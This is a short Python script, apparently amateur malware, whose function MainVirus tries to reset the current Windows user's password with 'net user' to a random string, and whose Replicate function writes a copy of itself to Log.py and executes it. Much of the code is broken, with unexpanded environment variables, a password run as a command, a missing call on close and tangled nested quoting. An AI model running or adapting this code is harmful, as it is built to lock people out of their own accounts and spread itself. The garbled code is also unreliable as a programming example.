import subprocess as sb
import random as r
import string as str

Log = 'Log'

Number = r.randint(5, 24)

lower = str.ascii_lowercase
higher = str.ascii_uppercase
numbers = str.digits
others = str.punctuation

all = lower + higher + numbers + others

temp = r.sample(all, Number)
password = "".join(temp)

def MainVirus():
    Name = sb.check_output(['echo', '%username%'])
    PasswordReset = sb.check_output(['net', 'user', Name, '*'])
    One = sb.check_output([password])
    Two = sb.check_output([password])
MainVirus()

def Replicate():
    text = '''
import subprocess as sb
import random as r
import string as str

Log = 'Log'

Number = r.randint(5, 24)

lower = str.ascii_lowercase
higher = str.ascii_uppercase
numbers = str.digits
others = str.punctuation

all = lower + higher + numbers + others

temp = r.sample(all, Number)
password = "".join(temp)

def MainVirus():
    Name = sb.check_output(['echo', '%username%'])
    PasswordReset = sb.check_output(['net', 'user', Name, '*'])
    One = sb.check_output([password])
    Two = sb.check_output([password])
MainVirus()

def Replicate():
    text = \'\'\'
import subprocess as sb
import random as r
import string as str

Log = 'Log'

Number = r.randint(5, 24)

lower = str.ascii_lowercase
higher = str.ascii_uppercase
numbers = str.digits
others = str.punctuation

all = lower + higher + numbers + others

temp = r.sample(all, Number)
password = "".join(temp)

def MainVirus():
    Name = sb.check_output(['echo', '%username%'])
    PasswordReset = sb.check_output(['net', 'user', Name, '*'])
    One = sb.check_output([password])
    Two = sb.check_output([password])
MainVirus()
Replicate()
f = open(Log+'.py', 'w')
f.write(text)
f.close
exec(open("Log.py").read())
    \'\'\'
    '''
    f = open(Log+'.py', 'w')
    f.write(text)
    f.close
Replicate()
exec(open("Log.py").read())
